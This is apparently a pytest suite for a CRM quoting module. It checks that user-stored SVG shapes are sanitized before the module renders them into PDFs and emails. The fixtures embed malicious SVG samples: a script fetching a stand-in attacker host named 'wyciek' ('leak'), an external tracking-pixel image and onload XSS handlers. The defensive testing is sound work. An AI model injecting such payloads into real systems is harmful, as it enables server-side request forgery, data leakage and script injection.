# -*- coding: utf-8 -*-
"""
Testy sanityzacji SVG na ŚCIEŻCE PDF/MAILA wyceny.

Kontekst: kolumny quote_items_details.shape_svg / edges_svg trafiają do bazy
verbatim. Do niedawna sanitizer był podpięty WYŁĄCZNIE w
build_client_finishing_entry (JSON publicznej strony), a generowanie PDF-a
konsumowało kolumnę surową:

* cairosvg (_svg_to_png_base64) — pobiera zasoby po http(s),
* offer_pdf.html -> {{ ... |safe }} -> WeasyPrint — też pobiera http(s).

Zapisane w wycenie <image xlink:href="http://atakujacy/x"> dawało więc żądanie
wychodzące Z SERWERA CRM (SSRF + piksel śledzący). Ścieżka mailowa dodatkowo w
ogóle nie dostawała map obrazków, przez co warunek {% if shape_images ... %}
był zawsze fałszywy i ZAWSZE odpalała się gałąź z surowym SVG.

Testujemy helpery bezpośrednio na SimpleNamespace (jak
tests/test_edge_name_generator.py) — bez podnoszenia Flaska ani bazy.
"""
import ast
import inspect
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from types import SimpleNamespace  # noqa: E402

import pytest  # noqa: E402
from jinja2 import Environment, nodes  # noqa: E402
from jinja2 import meta as jinja_meta  # noqa: E402

from modules.baselinker.edges_pdf_generator import EdgesPdfGenerator  # noqa: E402
from modules.quotes import routers  # noqa: E402

build_quote_preview_assets = routers.build_quote_preview_assets

_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TEMPLATE_PATH = os.path.join(_ROOT, "modules", "quotes", "templates", "offer_pdf.html")

# Mapy obrazków, które szablon offer_pdf.html musi dostać w OBU ścieżkach
# (pobranie PDF-a i wysyłka mailem).
WYMAGANE_MAPY = {"edges_images", "shape_images", "shape_svg_safe"}

ATAKUJACY = "atakujacy.example"

# Realistyczny kształt z kalkulatora (canvas2svg) + wstrzyknięte ładunki:
# <script>, zewnętrzny <image> i handler on*.
SHAPE_SVG_ZLOSLIWY = (
    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" '
    'viewBox="0 0 200 100" preserveAspectRatio="xMidYMid meet">'
    '<script>fetch("http://%s/wyciek")</script>'
    '<image xlink:href="http://%s/piksel.png" x="0" y="0" width="200" height="100"/>'
    '<rect x="5" y="5" width="190" height="90" fill="rgb(230,126,34)" '
    'stroke="#e67e22" stroke-width="1.5" onload="alert(1)"/>'
    '</svg>'
) % (ATAKUJACY, ATAKUJACY)

# Realistyczny widok izometryczny krawędzi (edges.js emituje linie z klasą
# "edges-hidden", na których _ensure_dashed_lines dokłada stroke-dasharray).
EDGES_SVG_ZLOSLIWY = (
    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" '
    'viewBox="0 0 300 200">'
    '<script>alert("xss")</script>'
    '<image xlink:href="http://%s/piksel.png" x="0" y="0" width="10" height="10"/>'
    '<line class="edges-line edges-hidden" data-edge="F" x1="10" y1="10" x2="290" y2="190" '
    'style="stroke: #e67e22; stroke-width: 2"/>'
    '</svg>'
) % ATAKUJACY

SHAPE_SVG_CZYSTY = (
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 100">'
    '<rect x="5" y="5" width="190" height="90" fill="#e67e22"/>'
    '</svg>'
)


def _detail(product_index=1, shape_svg=None, edges_svg=None):
    """Minimalny odpowiednik wiersza QuoteItemDetails."""
    return SimpleNamespace(
        product_index=product_index,
        shape_svg=shape_svg,
        edges_svg=edges_svg,
    )


@pytest.fixture
def przechwycone_svg(monkeypatch):
    """Podmienia konwerter PNG i zapamiętuje, CO dostał na wejściu."""
    przechwycone = []

    def _fake(self, svg_html, output_width=300, preserve_aspect=False):
        przechwycone.append(svg_html)
        return "data:image/png;base64,ATRAPA"

    monkeypatch.setattr(EdgesPdfGenerator, "_svg_to_png_base64", _fake)
    return przechwycone


def _bez_aktywnej_tresci(svg):
    """Wspólne asercje: żadnych skryptów, obrazków zewnętrznych ani handlerów."""
    assert svg, "sanitizer nie powinien zjeść całego SVG"
    lowered = svg.lower()
    assert "<script" not in lowered
    assert "<image" not in lowered
    assert ATAKUJACY not in lowered
    assert "onload" not in lowered
    # Jedyne dozwolone http(s) w wyniku to deklaracje przestrzeni nazw
    # (xmlns="http://www.w3.org/2000/svg"). Wszystko inne = zasób zewnętrzny,
    # czyli żądanie wychodzące z serwera CRM przy renderowaniu PDF-a.
    bez_deklaracji_ns = re.sub(r'xmlns(:[a-z]+)?="[^"]*"', "", lowered)
    assert "http://" not in bez_deklaracji_ns
    assert "https://" not in bez_deklaracji_ns


# --- 1. Konwerter PNG dostaje wartość PO sanityzacji -------------------------

def test_shape_svg_do_png_przechodzi_przez_sanitizer(przechwycone_svg):
    assets = build_quote_preview_assets([_detail(shape_svg=SHAPE_SVG_ZLOSLIWY)])

    assert przechwycone_svg, "konwerter PNG powinien zostać wywołany"
    for svg in przechwycone_svg:
        _bez_aktywnej_tresci(svg)
    # Rysunek ma przeżyć czyszczenie — inaczej sanityzacja zjadłaby podgląd.
    assert "<rect" in przechwycone_svg[0]
    assert assets["shape_images"][1] == "data:image/png;base64,ATRAPA"


def test_edges_svg_do_png_przechodzi_przez_sanitizer(przechwycone_svg):
    assets = build_quote_preview_assets([_detail(edges_svg=EDGES_SVG_ZLOSLIWY)])

    assert przechwycone_svg, "konwerter PNG powinien zostać wywołany"
    for svg in przechwycone_svg:
        _bez_aktywnej_tresci(svg)
    assert "<line" in przechwycone_svg[0]
    assert assets["edges_images"][1] == "data:image/png;base64,ATRAPA"


def test_do_png_nie_trafia_surowa_kolumna(przechwycone_svg):
    build_quote_preview_assets([
        _detail(product_index=1, shape_svg=SHAPE_SVG_ZLOSLIWY, edges_svg=EDGES_SVG_ZLOSLIWY),
    ])

    assert len(przechwycone_svg) == 2
    assert SHAPE_SVG_ZLOSLIWY not in przechwycone_svg
    assert EDGES_SVG_ZLOSLIWY not in przechwycone_svg


# --- 2. Szablon dostaje wartość oczyszczoną, nie surową kolumnę --------------

def test_mapa_dla_szablonu_zawiera_svg_oczyszczony(przechwycone_svg):
    assets = build_quote_preview_assets([_detail(shape_svg=SHAPE_SVG_ZLOSLIWY)])

    oczyszczony = assets["shape_svg_safe"][1]
    _bez_aktywnej_tresci(oczyszczony)
    assert oczyszczony != SHAPE_SVG_ZLOSLIWY
    assert "<rect" in oczyszczony


def test_szablon_stosuje_safe_tylko_do_mapy_shape_svg_safe():
    """
    Regresja na offer_pdf.html: filtr |safe nie może stać przy surowej kolumnie.
    Sprawdzamy AST Jinjy (komentarze {# #} są przez parser wycinane, więc nie
    da się przejść testu samym opisem w komentarzu).
    """
    with open(TEMPLATE_PATH, encoding="utf-8") as fh:
        source = fh.read()

    drzewo = Environment().parse(source)

    cele_safe = [node.node for node in drzewo.find_all(nodes.Filter) if node.name == "safe"]
    assert cele_safe, "szablon powinien nadal renderować podgląd kształtu przez |safe"

    for cel in cele_safe:
        atrybuty = set(n.attr for n in cel.find_all(nodes.Getattr))
        assert "shape_svg" not in atrybuty
        assert "edges_svg" not in atrybuty
        nazwy = set(n.name for n in cel.find_all(nodes.Name))
        assert "shape_svg_safe" in nazwy

    # Surowe kolumny nie mają prawa pojawić się w szablonie W OGÓLE — nawet
    # w warunku, bo wtedy szablon rysowałby pustą ramkę dla SVG, którego
    # sanitizer nie przepuścił.
    wszystkie_atrybuty = set(n.attr for n in drzewo.find_all(nodes.Getattr))
    assert "shape_svg" not in wszystkie_atrybuty
    assert "edges_svg" not in wszystkie_atrybuty

    assert "shape_svg_safe" in jinja_meta.find_undeclared_variables(drzewo)


# --- 3. Ścieżka mailowa dostaje te same mapy co pobranie PDF -----------------

def _kwargi_render_template(nazwa_funkcji):
    drzewo = ast.parse(inspect.getsource(routers))
    for wezel in ast.walk(drzewo):
        if isinstance(wezel, ast.FunctionDef) and wezel.name == nazwa_funkcji:
            for call in ast.walk(wezel):
                if isinstance(call, ast.Call) and getattr(call.func, "id", None) == "render_template":
                    return set(kw.arg for kw in call.keywords)
    raise AssertionError("nie znaleziono render_template w %s" % nazwa_funkcji)


def test_sciezka_mailowa_dostaje_mapy_obrazkow():
    """
    Regresja: send_email renderował offer_pdf.html BEZ shape_images/edges_images,
    więc warunek {% if shape_images and ... %} był zawsze fałszywy i mail leciał
    gałęzią z surowym SVG.
    """
    assert WYMAGANE_MAPY <= _kwargi_render_template("send_email")


def test_sciezka_pobrania_pdf_dostaje_mapy_obrazkow():
    assert WYMAGANE_MAPY <= _kwargi_render_template("generate_quote_pdf")


def test_obie_sciezki_uzywaja_wspolnego_helpera():
    for nazwa in ("send_email", "generate_quote_pdf"):
        zrodlo = inspect.getsource(getattr(routers, nazwa))
        assert "build_quote_preview_assets" in zrodlo, nazwa


# --- 4. Zachowanie przy błędzie: brak podglądu, ale PDF się generuje ---------

@pytest.mark.parametrize("smiec", [
    "to nie jest svg",
    "<svg><script>alert(1)</script></svg>",   # zostaje pusty <svg> -> None
    "<svg xmlns='http://www.w3.org/2000/svg'><rect",  # niedomknięty XML
])
def test_svg_nie_do_odratowania_daje_brak_podgladu(przechwycone_svg, smiec):
    assets = build_quote_preview_assets([_detail(shape_svg=smiec, edges_svg=smiec)])

    assert assets["shape_svg_safe"] == {}
    assert assets["shape_images"] == {}
    assert assets["edges_images"] == {}
    assert przechwycone_svg == [], "nie wołamy cairosvg na SVG, którego nie da się oczyścić"


def test_brak_svg_nie_wywraca_helpera(przechwycone_svg):
    assets = build_quote_preview_assets([_detail(shape_svg=None, edges_svg=None)])
    assert assets == {
        "edges_images": {},
        "shape_images": {},
        "shape_svg_safe": {},
    }


def test_pusta_lista_detali(przechwycone_svg):
    assert build_quote_preview_assets(None)["shape_images"] == {}
    assert build_quote_preview_assets([])["edges_images"] == {}


# --- 5. Sanityzacja nie psuje realnej konwersji (bez atrapy cairosvg) -------

def test_oczyszczony_svg_nadal_konwertuje_sie_do_png():
    """Bez atrapy: sprawdzamy, że wynik sanitizera cairosvg nadal łyka."""
    assets = build_quote_preview_assets([
        _detail(shape_svg=SHAPE_SVG_CZYSTY),
    ])

    assert assets["shape_images"][1].startswith("data:image/png;base64,")
